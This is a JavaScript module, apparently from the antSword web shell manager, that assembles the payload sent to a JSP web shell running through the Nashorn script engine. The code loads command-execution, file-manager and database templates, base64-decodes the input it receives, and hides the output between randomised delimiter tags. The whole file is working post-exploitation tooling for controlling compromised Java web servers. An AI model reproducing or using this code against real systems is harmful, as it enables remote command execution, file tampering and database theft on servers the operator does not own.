/**
 * JSP_JS服务端脚本模板
 * 开写：2021/04/06
 * 更新：-
 * 作者：yzddMr6 <https://github.com/yzddmr6>
 */
'use strict';

const Base = require('../base');

class JSP_JS extends Base {
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base',
      'command',
      'filemanager',
      'database/sqlserver',
      'database/mysql',
      'database/oracle'
    ].map((_) => {
      this.parseTemplate(`./jsp_js/template/${_}`);
    });
    // 解析编码器
    this
      .encoders
      .map((_) => {
        this.parseEncoder(`./jsp_js/encoder/${_}`);
      });
    this
      .decoders
      .map((_) => {
        this.parseDecoder(`./jsp_js/decoder/${_}`);
      });
  }

  /**
   * 获取编码器列表
   * ? 可以在antSword.core.php.prototype.encoders中获取此变量
   * @return {array} 编码器列表
   */
  get encoders() {
    return [];
  }

  get decoders() {
    return ["default"];
  }
  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @param {bool} force_default 强制使用 default 解码
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data, force_default = false) {
    // 分隔符号
    let tag_s, tag_e;
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
      tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
    } else {
      tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "->|";
    }
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
      tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
    } else {
      tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "|<-";
    }
    let jspencode = this.__opts__['encode'];

    switch (this.__opts__['encode']) {
      case "UTF8":
        jspencode = "UTF-8";
        break;
      default:
        break;
    }
    let asencCode;
    let ext = {
      opts: this.__opts__,
    };
    if (!force_default) {
      asencCode = this.__decoder__[this.__opts__['decoder'] || 'default'].asoutput(ext);
    } else {
      asencCode = this.__decoder__['default'].asoutput(ext);
    }
    // 组合完整的代码
    let tmpCode = data['_'];
    
    data['_'] = `
    try {
      load("nashorn:mozilla_compat.js");
    } catch (e) {}
    importPackage(Packages.java.util);
    importPackage(Packages.java.lang);
    importPackage(Packages.java.io);
    var output = new StringBuffer("");
    var cs = "${jspencode}";
    var tag_s = "${tag_s}";
    var tag_e = "${tag_e}";
    try {
      response.setContentType("text/html");
      request.setCharacterEncoding(cs);
      response.setCharacterEncoding(cs);
      function decode(str) {
        str = str.substr(#randomPrefix#);
        var bt=Base64DecodeToByte(str);
        return new java.lang.String(bt,cs);
      }
      function Base64DecodeToByte(str) {
        importPackage(Packages.sun.misc);
        importPackage(Packages.java.util);
        var bt;
        try {
          bt = new BASE64Decoder().decodeBuffer(str);
        } catch (e) {
          bt = Base64.getDecoder().decode(str);
        }
        return bt;
      }
      ${asencCode}
      ${tmpCode}
    } catch (e) {
      output.append("ERROR:// " + e.toString());
    }
    try {
      response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e);
    } catch (e) {}
    `.replace(/\n\s+/g, '').replace(/#randomPrefix#/g, this.__opts__.otherConf["random-Prefix"]);
    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = JSP_JS;